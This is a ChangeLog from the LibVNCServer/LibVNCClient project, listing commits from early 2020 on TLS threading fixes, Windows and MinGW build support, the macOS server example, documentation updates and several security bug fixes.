	* AUTHORS: AUTHORS: bring up to date

2020-05-22  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: AUTHORS: reword some paragraphs to reflect community
	development

2020-05-22  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: add 0.9.13 release description

2020-05-19  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: libvncclient/rfbproto: only select TLS or
	VeNCrypt sectypes if supported by build Closes #410

2020-05-17  Christian Beier <dontmind@freeshell.org>

	* .gitignore: .gitignore: cleanup a bit

2020-05-17  Christian Beier <dontmind@freeshell.org>

	* .gitignore: .gitignore: add doxygen output dir

2020-05-17  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: libvncserver/rfbserver: fix possible
	divide-by-zero Closes #409

2020-05-14  Christian Beier <dontmind@freeshell.org>

	* README.md: README: add CMake install instructions for various
	platforms Closes #407 Thanks gauravshremayee for the initial input!

2020-05-01  Gaurav Ujjwal <gujjwal00@gmail.com>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: Use correct
	type for return value.  ReadFromTLS & WriteToTLS returns value of
	type int. SSL_read & SSL_write also returns an int.

2020-05-01  Gaurav Ujjwal <gujjwal00@gmail.com>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: Remove
	unused macro.  This macro was introduced by
	https://github.com/LibVNC/libvncserver/pull/50 .  We are not using
	recursive mutex anymore so this can be removed.

2020-05-01  Gaurav Ujjwal <gujjwal00@gmail.com>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: Remove
	unused variables

2020-05-10  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: update w.r.t. mac example

2020-05-03  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: mention client TLS locking

2020-05-02  Christian Beier <dontmind@freeshell.org>

	* README.md: README: add supported encodings matrix

2020-05-02  Christian Beier <dontmind@freeshell.org>

	* README.md: README: condense security type tables into one

2020-05-02  Christian Beier <dontmind@freeshell.org>

	* README.md: README: add section about actual RFB support re #135, thanks @giox069 for the initial table

2020-04-30  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #405 from gujjwal00/openssl-refactor Use common mutex defines for OpenSSL backend

2020-04-30  Gaurav Ujjwal <gujjwal00@gmail.com>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: Remove
	duplicate include

2020-04-30  Gaurav Ujjwal <gujjwal00@gmail.com>

	* common/threading.h, libvncclient/tls_openssl.c: 
	libvncclient/tls_openssl: Use common mutex defines for OpenSSL
	backend.  It also defers locking callback cleanup so that it will be
	done by the OS when process exits.

2020-04-30  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #401 from gujjwal00/rw-mutex Add TLS R/W mutex to rfbClient

2020-04-29  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: mention Gitter

2020-04-29  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #404 from gitter-badger/gitter-badge README: add Gitter chat badge

2020-04-29  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: partial update for the upcoming 0.9.13 release

2020-04-29  Gaurav Ujjwal <gujjwal00@gmail.com>

	* libvncclient/tls_openssl.c: Replace global R/W mutex with the one
	from rfbClient

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.c: examples/mac: rename 'rfb'-prefixed symbols
	unrelated to LibVNCServer

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.c: examples/mac: comment globals

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.c: examples/mac: fix comment w.r.t input handlers

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.c: examples/mac: note work done in boilerplate
	comment

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.c: examples/mac: remove unneeded #includes and
	#undefs

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.c: examples/mac: move all globals to top of source
	file

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: Revert "CMake: allow different source types for
	server examples" This reverts commit 73ee3903f2d81ecdd2216a59f33a03dc594c16e3.

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt, examples/{mac.m => mac.c}: Revert "examples:
	rename mac.c to mac.m" This reverts commit 1f19778b0f414f772b1c6cff90a9d20694d339e6.

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt, examples/mac.m: examples/mac: remove Cocoa linkage
	again, we don't need it

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: add mouse scroll, fix mouse button
	order

2020-04-26  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: fix keyboard handling to support
	different keyboard layouts

2020-04-25  Gaurav Ujjwal <gujjwal00@gmail.com>

	* rfb/rfbclient.h: Add TLS R/W mutex to rfbClient

2020-04-24  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #400 from veyon/read-timeout libvncclient: handle half-open TCP connections

2020-04-23  Christian Beier <dontmind@freeshell.org>

	* README.md: README: de-dup non-public contact info

2020-04-23  Christian Beier <dontmind@freeshell.org>

	* README.md: README: remove typo

2020-04-23  Christian Beier <dontmind@freeshell.org>

	* README.md: README: remove example explainer that's already in the
	API docs

2020-04-23  Christian Beier <dontmind@freeshell.org>

	* README.md: README: remove duplicate and partly obsolete API
	documentation ...and link the real API docs instead.

2020-04-23  Christian Beier <dontmind@freeshell.org>

	* README.md: README: move 'Basics' section to intro Rest is covered way better in the Wikipedia article.

2020-04-22  Christian Beier <dontmind@freeshell.org>

	* common/threading.h, rfb/rfb.h: libvncserver: move threading
	defines to common re #398

2020-04-15  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: check input permissions early ...and fail if not given instead of try-and-warn on input.  Very much less prone to user oversight this way.

2020-04-12  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: use library-provided viewonly
	functionality Also gets rid of a compiler warning.

2020-04-12  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: add multi-monitor support

2020-04-12  Christian Beier <dontmind@freeshell.org>

	* HISTORY.md, README.md: README: split out history section

2020-04-11  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: update comment about cursor handling

2020-04-11  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: fix a possible segfault due to a
	race condition

2020-04-11  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt, examples/mac.m: examples/mac: port to
	CGDisplayStream API ...yielding a massive performance improvement by: * only updating framebuffers on change * indicating which regions have changed, resulting in way less data
	to be sent ober the network

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: make sure LSP file copying happens on
	supported systems only

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: copy compile_commands.json to source root Works around https://github.com/bbatsov/projectile/issues/1513

2020-03-29  iordan iordanov <iiordanov@gmail.com>

	* libvncclient/vncviewer.c: libvncclient: search backward for port
	colon in order to support IPV6 addresses

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* TODO.md: TODO: update and link issues

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* TODO.md: TODO: remove obsolete items

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* TODO.md: TODO: markdown'ify

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* TODO => TODO.md: TODO: rename to TODO.md

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: make sure LSP file copying happens on
	supported systems only

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* README.md: README: move success stories to homepage

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: copy compile_commands.json to source root Works around https://github.com/bbatsov/projectile/issues/1513

2020-04-11  Christian Beier <dontmind@freeshell.org>

	* client_examples/vnc2mpg.c: client_examples/vnc2mpg: fix a
	deprecation warning

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* Doxyfile, README.md, examples/blooptest.c, examples/fontsel.c,
	examples/pnmshow24.c, examples/storepasswd.c: README: move
	explainers about examples into source files

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* README.md: README: remove obsolete Windows section

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* README.md: README: document novnc changes

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* .gitmodules, webclients/novnc,
	webclients/novnc/app/error-handler.js,
	webclients/novnc/app/images/alt.svg,
	webclients/novnc/app/images/clipboard.svg,
	webclients/novnc/app/images/connect.svg,
	webclients/novnc/app/images/ctrl.svg,
	webclients/novnc/app/images/ctrlaltdel.svg,
	webclients/novnc/app/images/disconnect.svg,
	webclients/novnc/app/images/drag.svg,
	webclients/novnc/app/images/error.svg,
	webclients/novnc/app/images/esc.svg,
	webclients/novnc/app/images/expander.svg,
	webclients/novnc/app/images/fullscreen.svg,
	webclients/novnc/app/images/handle.svg,
	webclients/novnc/app/images/handle_bg.svg,
	webclients/novnc/app/images/icons/Makefile,
	webclients/novnc/app/images/icons/novnc-icon-sm.svg,
	webclients/novnc/app/images/icons/novnc-icon.svg,
	webclients/novnc/app/images/info.svg,
	webclients/novnc/app/images/keyboard.svg,
	webclients/novnc/app/images/mouse_left.svg,
	webclients/novnc/app/images/mouse_middle.svg,
	webclients/novnc/app/images/mouse_none.svg,
	webclients/novnc/app/images/mouse_right.svg,
	webclients/novnc/app/images/power.svg,
	webclients/novnc/app/images/settings.svg,
	webclients/novnc/app/images/tab.svg,
	webclients/novnc/app/images/toggleextrakeys.svg,
	webclients/novnc/app/images/warning.svg,
	webclients/novnc/app/locale/de.json,
	webclients/novnc/app/locale/el.json,
	webclients/novnc/app/locale/es.json,
	webclients/novnc/app/locale/nl.json,
	webclients/novnc/app/locale/pl.json,
	webclients/novnc/app/locale/sv.json,
	webclients/novnc/app/locale/tr.json,
	webclients/novnc/app/locale/zh.json,
	webclients/novnc/app/localization.js,
	webclients/novnc/app/sounds/CREDITS,
	webclients/novnc/app/styles/base.css,
	webclients/novnc/app/styles/lite.css, webclients/novnc/app/ui.js,
	webclients/novnc/app/webutil.js, webclients/novnc/core/base64.js,
	webclients/novnc/core/des.js, webclients/novnc/core/display.js,
	webclients/novnc/core/encodings.js,
	webclients/novnc/core/inflator.js,
	webclients/novnc/core/input/domkeytable.js,
	webclients/novnc/core/input/fixedkeys.js,
	webclients/novnc/core/input/keyboard.js,
	webclients/novnc/core/input/keysym.js,
	webclients/novnc/core/input/keysymdef.js,
	webclients/novnc/core/input/mouse.js,
	webclients/novnc/core/input/util.js,
	webclients/novnc/core/input/vkeys.js,
	webclients/novnc/core/input/xtscancodes.js,
	webclients/novnc/core/rfb.js,
	webclients/novnc/core/util/browser.js,
	webclients/novnc/core/util/events.js,
	webclients/novnc/core/util/eventtarget.js,
	webclients/novnc/core/util/logging.js,
	webclients/novnc/core/util/polyfill.js,
	webclients/novnc/core/util/strings.js,
	webclients/novnc/core/websock.js,
	webclients/novnc/vendor/browser-es-module-loader/.npmignore,
	webclients/novnc/vendor/browser-es-module-loader/README.md,
	webclients/novnc/vendor/browser-es-module-loader/dist/babel-worker.
	js,
	webclients/novnc/vendor/browser-es-module-loader/dist/browser-es-mo
	dule-loader.js,
	webclients/novnc/vendor/browser-es-module-loader/dist/browser-es-mo
	dule-loader.js.map,
	webclients/novnc/vendor/browser-es-module-loader/rollup.config.js,
	webclients/novnc/vendor/browser-es-module-loader/src/babel-worker.j
	s,
	webclients/novnc/vendor/browser-es-module-loader/src/browser-es-mod
	ule-loader.js, webclients/novnc/vendor/pako/LICENSE,
	webclients/novnc/vendor/pako/README.md,
	webclients/novnc/vendor/pako/lib/utils/common.js,
	webclients/novnc/vendor/pako/lib/zlib/adler32.js,
	webclients/novnc/vendor/pako/lib/zlib/constants.js,
	webclients/novnc/vendor/pako/lib/zlib/crc32.js,
	webclients/novnc/vendor/pako/lib/zlib/deflate.js,
	webclients/novnc/vendor/pako/lib/zlib/gzheader.js,
	webclients/novnc/vendor/pako/lib/zlib/inffast.js,
	webclients/novnc/vendor/pako/lib/zlib/inflate.js,
	webclients/novnc/vendor/pako/lib/zlib/inftrees.js,
	webclients/novnc/vendor/pako/lib/zlib/messages.js,
	webclients/novnc/vendor/pako/lib/zlib/trees.js,
	webclients/novnc/vendor/pako/lib/zlib/zstream.js,
	webclients/novnc/vendor/promise.js,
	webclients/novnc/vendor/sinon.js, webclients/novnc/vnc.html: 
	webclients: include novnc 1.1.0 as a submodule instead of a verbatim
	copy

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: libvncclient/rfbproto: limit max textchat
	size Addresses GitHub Security Lab (GHSL) Vulnerability Report
	`GHSL-2020-063`.  Re #275

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: fix broken link

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: merge in the website's News section

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: fix indentation

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* NEWS.md: NEWS: markdown'ify

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* README.md: README: fix link to NEWS.md

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* NEWS => NEWS.md: NEWS: rename to NEWS.md

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* README.md: README: add all success stories from the website

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c, rfb/rfbclient.h: libvncclient: document
	connect functions

2020-04-10  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c, rfb/rfbclient.h: libvncclient: make
	SetBlocking() public ...to be in line with SetNonBlocking() being public.

2020-04-07  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: libvncserver: let rfbFreeCursor decide on
	cursor cleanup It has the logic to do this.  Closes #393

2020-04-07  Christian Beier <dontmind@freeshell.org>

	* .gitignore, CMakeLists.txt, test/cursortest.c =>
	examples/cursors.c: examples/cursors: move from 'test' and add to
	build system

2020-04-06  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: check for input permissions as well

2020-04-06  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: improve screen recording error
	message

2020-04-06  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: error out if screen recording
	permissions were not given

2020-04-05  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: enable framebuffer writes and reads
	at the same time ...by using double buffering. Before, a framebuffer refresh/write
	would have to wait for a send/read to finish. Now, we can start
	updating the framebuffer while a send of the previous frame is in
	progress.

2020-04-04  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: make frambuffer writes and reads
	mutually exclusive Fixes artifacts when moving windows around.

2020-04-04  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: do the VNC operations in background
	threads Also, define a target framerate and sleep for the rest of the frame
	time slot to not hog the CPU.  Fixes laggy input.  TODO: as the framebuffer is not locked during read/write, there are
	now artifacts to be seen when moving windows around.

2020-04-04  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: CMake: declare that examples/mac needs threading

2020-04-02  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: libvncserver/rfbserver: make two more
	socket checks cross-platform Closes #392

2020-03-29  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: do not query native display for
	pixel info We're not directly accessing the display framebuffer anymore but are
	using a self-defined copy instead, so this is totally fine to
	hardcode.  What's more, the API has been deprecated and made private, we're
	pretty lucky this worked anyway.

2020-03-29  Christian Beier <cb@shoutrlabs.com>

	* examples/mac.m: examples/mac: get framebuffer updates again on
	nowaday's MacOS This is still rather a POC, there's stuff left to do: * Replace deprecated API calls.  * It basically hogs one CPU even when idle. Fix that.  * (Hopefully)
	fix super laggy input by going multithreaded.  * Detect missing permissions to get screen contents and fake input
	  and tell user about it plus indicate what do to.

2020-03-28  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt, examples/mac.m: examples/mac: link and use Cocoa

2020-03-28  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt, examples/{mac.c => mac.m}: examples: rename mac.c
	to mac.m

2020-03-28  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: CMake: allow different source types for server
	examples

2020-03-28  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #390 from gujjwal00/ssl-error-call-protection libvncclient/tls_openssl: move calls to `SSL_get_error` within mutex
	lock

2020-03-26  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #389 from gujjwal00/fix-tls-multithread-rw libvncclient: fix multithreaded read/write with TLS for OpenSSL.

2020-03-23  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #386 from iiordanov/master Fix for missing stdio.h include needed for iOS

2020-03-22  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: fix crosscompilation to iOS Closes #385

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* common/vncauth.c: common/vncauth: silence C4996 warnings from MSVC

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* common/vncauth.c: common/vncauth: add missing include for getpid()

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* common/turbojpeg.h: common/turbojpeg: silence C4996 warnings from
	MSVC

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbclient.h: libvncclient: silence C4996 warnings from MSVC

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c: libvncclient/sockets: remove unneeded code
	for MSVC

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* rfb/rfb.h: libvncserver: silence the C4996 warnings from MSVC

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: libvncserver/rfbserver: fix a bunch of
	MSVC warnings

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: libvncclient/rfbproto: fix some MSVC
	warnings

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/stats.c: libvncserver/stats: fix a bunch of MSVC
	warnings

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* rfb/rfb.h: rfb/rfb.h: fix a warning for the win32 THREAD_JOIN

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* test/encodingstest.c: test/encodingstest: use cross-platform sleep

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #382 from LibVNC/3-windows-multithread Implement multithreading for win32

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, test/encodingstest.c: test: port encodintstest to
	win32 threads

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: only set threading config if
	WITH_THREADS=ON Other find_package() calls (notably the one for SDL2) look for
	threads as well, setting the respective *_INIT vars, so make it more
	explicit to be able to disable threadings at build time.

2020-03-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c, libvncserver/rfbserver.c,
	libvncserver/sockets.c, rfb/rfb.h: libvncserver: implement native
	win32 threading Closes #3

2020-03-18  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: add option for choosing if both win32 and
	pthreads are there This happens on MinGW and defaults to pthreads as in previous
	LibVNCServer versions.

2020-03-15  Volker Ruppert <vruppert@github.com>

	* libvncserver/main.c, libvncserver/rfbserver.c, rfb/rfb.h: 
	libvncserver: add mutex support for win32 using Critical Sections

2020-03-14  Christian Beier <dontmind@freeshell.org>

	* examples/example.c: examples: let blooptest use win32 threads as
	well

2020-03-14  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: build blooptest example for win32 threads
	as well

2020-03-14  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmakein: CMake: detect native
	win32 threads

2020-03-12  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: build the mac example re #217

2020-03-12  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: fix cyrus-sasl download link

2020-03-12  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: fix anonTLS
	connection setup ...for OpenSSL 1.0.2, LibreSSL and OpenSSL 1.1.x Thanks go to Gaurav Ujjwal who did the groundwork finding out the
	root cause ADH cipher.  Closes #347

2020-03-11  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: fix building
	with LibreSSL

2020-03-10  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/rfbproto.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c, rfb/rfbclient.h: LibVNCClient: add connect
	timeout support Depending on the platform and the TCP/IP stack configuration
	connect() can block for a very long time if the destination host is
	unreachable.  The current behaviour blocks VNC client loops for an
	uncertain amount of time. However some applications may want to
	implement responsive VNC client threads requiring rfbInitClient() to
	time out more quickly. This can be achieved by calling connect() on
	a non-blocking socket and select() with a timeout afterwards. The
	new WaitForConnected() function deals with the platform-specific
	behaviour of this mechanism.

2020-03-08  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #380 from ffontaine/master CMake: don't build tight.c without png or zlib

2020-03-07  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: fix
	connection setup with OpenSSL 1.1.x Connecting to some servers, e.g. vino 3.22, fails with OpenSSL 1.1.x
	when this compatibility setting is not applied, probably because
	something deemed insecure in the default level 1 is getting used.  See

	https://www.openssl.org/docs/man1.1.0/man3/SSL_set_security_level.htmlre #347

2020-03-07  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: add gtkvncviewer client example to the
	build system

2020-03-06  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls_openssl.c: libvncclient/tls_openssl: do not deref
	a NULL pointer Happens in anonTLS mode where cred is NULL.  re #347

2020-03-04  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #379 from kalvdans/dont-print-garbage libvncserver/sockets: don't print an uninitialized string

2020-03-03  Christian Beier <dontmind@freeshell.org>

	* README.md: README: highlight code a la markdown

2020-03-03  Christian Beier <dontmind@freeshell.org>

	* README.md: README: mention that one needs mingw-w64 for
	crosscompiling Closes #378

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbssl_openssl.c: libvncserver/rfbssl_openssl: make
	it work w/ OpenSSL 1.0.2g as well

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbssl_openssl.c: libvncserver/rfbssl_openssl: fix
	OpenSSL-encrypted Websockets

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbssl_gnutls.c: libvncserver/rfbssl_gnutls: move
	priority setting up Fixes a GnuTLS parse error with the old code.  re #68

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #268 from
	rgacogne/fix-logical-not-parentheses LibVNCServer: Fix 'logical not is only applied to the..' warnings

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* webclients/index.vnc: webclients/index.vnc: add button to connect
	noVNC encrypted

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbssl_gnutls.c: libvncserver/rfbssl_gnutls: fix
	failing GnuTLS init The error was 'No or insufficient priorities were set.', causing
	session setup to fail.

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* TODO, webclients/index.vnc,
	webclients/java-applet/javaviewer.pseudo_proxy.patch,
	webclients/java-applet/ssl/README,
	webclients/java-applet/ssl/index.vnc,
	webclients/java-applet/ssl/onetimekey,
	webclients/java-applet/ssl/proxy.vnc,
	webclients/java-applet/ssl/ss_vncviewer,
	webclients/java-applet/ssl/tightvnc-1.3dev7_javasrc-vncviewer-curso
	r-colors+no-tab-traversal.patch,
	webclients/java-applet/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.p
	atch, webclients/java-applet/ssl/ultra.vnc,
	webclients/java-applet/ssl/ultraproxy.vnc,
	webclients/java-applet/ssl/ultrasigned.vnc,
	webclients/java-applet/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: 
	webclients: remove the Java applet, NPAPI is long deprecated in
	browsers

2020-03-01  Christian Beier <dontmind@freeshell.org>

	* README.md: README: fix websockets instructions

2020-02-28  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #377 from ffontaine/master libvnc{client,server}.pc.cmakein: remove zlib

2020-02-16  Christian Beier <dontmind@freeshell.org>

	* examples/repeater.c: examples: write to socket in a way that's
	also usable on win32

2020-02-16  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls_gnutls.c, libvncclient/tls_openssl.c: 
	libvncclient: remove superfluous check in ReadVeNCryptSecurityType As count is a U8 in the RFB spec, it can never exceed tAuth[256].  Also, the check used sizeof() wrong, it did not take into account
	that sizeof() is returning the size in bytes.  Closes #333

2020-02-14  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #375 from veyon/fix-readbuf-signedness rfbserver: make readBuf in rfbSendFileTransferChunk a signed char
	array

2020-02-12  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #374 from veyon/fix-headers Fix some headers for MingGW compilation

2020-02-11  Tobias Junghans <tobydox@veyon.io>

	* libvncserver/main.c: libvncserver: include sys/time.h if available In order to use gettimeofday() the sys/time.h header should be
	included.

2020-02-10  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c: 
	libvncserver/tightvnc-filetransfer: remove always-false comparison rtcp->rcft.rcfu.fName is an array and cannot be NULL.

2020-02-09  Christian Beier <dontmind@freeshell.org>

	* common/sockets.h, libvncclient/sasl.c, libvncclient/sockets.c,
	libvncclient/tls_gnutls.c, libvncserver/httpd.c,
	libvncserver/main.c, libvncserver/rfbserver.c,
	libvncserver/scale.c, libvncserver/sockets.c: build: de-dup socket
	defines and centralise in common file Less LOC and fixes #362 on the way.

2020-02-08  Christian Beier <dontmind@freeshell.org>

	* README.md: README: add some more projects using us

2020-02-02  Christian Beier <dontmind@freeshell.org>

	* README.md: README: link NEWS

2020-02-02  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: build and use libjpeg-turbo Closes #322

2020-02-02  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c, libvncclient/vncviewer.c,
	libvncserver/main.c, libvncserver/sockets.c: Start/stop Winsock on
	server/client init/shutdown Closes #25

2020-01-30  Christian Beier <dontmind@freeshell.org>

	* libvncclient/vncviewer.c: libvncclient: use the simple
	ReadPassword() for win32, too Closes #223

2020-01-30  Christian Beier <dontmind@freeshell.org>

	* .travis.yml, cmake/Toolchain-cross-mingw32-linux.cmake: TravisCI:
	use wine for running MinGW tests

2020-01-30  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: add MinGW crosscompilation from Linux

2020-01-30  Christian Beier <dontmind@freeshell.org>

	* README.md: README: explain how to crosscompile with MingGW

2020-01-30  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: require Windows Vista API only if needed

2019-12-05  Tobias Junghans <tobydox@veyon.io>

	* CMakeLists.txt,
	libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.h,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	rfb/rfbconfig.h.cmakein: tightvnc-filetransfer: add MinGW64 build
	support MinGW64 provides with pthreads which allows to build libvncserver
	with tightvnc-filetransfer support. This commit adds support Windows
	platform support.

2020-01-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: libvncserver: don't use self-pipe trick on
	Windows First and foremost, pipe() is not available.  Then, the whole self-pipe trick is not needed as a server-side close
	wakes up the select(), contrary to Unix.

2020-01-29  Christian Beier <dontmind@freeshell.org>

	* cmake/Toolchain-cross-mingw32-linux.cmake: CMake: add a MinGW32
	toolchain file for Linux Stolen from
	https://cmake.org/Wiki/File:Toolchain-cross-mingw32-linux.cmake with
	USER_ROOT_PATH set to 'deps' directory.

2020-01-19  Christian Beier <dontmind@freeshell.org>

	* .gitignore: gitignore: add language-server artifacts

2019-12-05  Tobias Junghans <tobydox@veyon.io>

	* test/tjutil.h: test: tjutil: define string macros for MSVC only

2019-12-05  Tobias Junghans <tobydox@veyon.io>

	* CMakeLists.txt: CMake: skip libsystemd check for Windows builds When cross-compiling libvncserver for Windows CMake may find native
	systemd headers and erroneously assume systemd support.

2020-01-15  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #369 from veyon/openssl Minor OpenSSL compatibility fixes

2020-01-15  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c: libvncclient: handle empty hostname in
	IPv6 connect like IPv4 case

2020-01-15  Tobias Junghans <tobydox@veyon.io>

	* common/crypto_openssl.c: crypto_openssl: make compatible with
	OpenSSL 1.1.0 DH_get0_priv_key() and DH_get0_pub_key() have been introduced in
	OpenSSL 1.1.1. Use DH_get0_key() instead of the simplified helpers.

2020-01-15  Tobias Junghans <tobydox@veyon.io>

	* common/crypto_openssl.c: crypto_openssl: include openssl/rand.h

2020-01-15  Tobias Junghans <tobydox@veyon.io>

	* libvncclient/rfbproto.c: libvncclient: rfbproto: do not fallback
	to IPv4 The IPv4 code which is used as fallback contains calls to deprecated
	network functions such as gethostbyname() which are not thread-safe
	and thus can lead to crashes when called in multiple threads at the
	same time. The IPv6 code properly uses getaddrinfo() which does not
	suffer from these problems. When IPv6 is enabled the modern code
	paths should be used exclusively. It's unlikely anyway that the
	legacy network code succeeds after IPv6 (which is capable of
	establishing IPv4 connections as well) failed before.  Closes #262.

2020-01-15  Christian Beier <dontmind@freeshell.org>

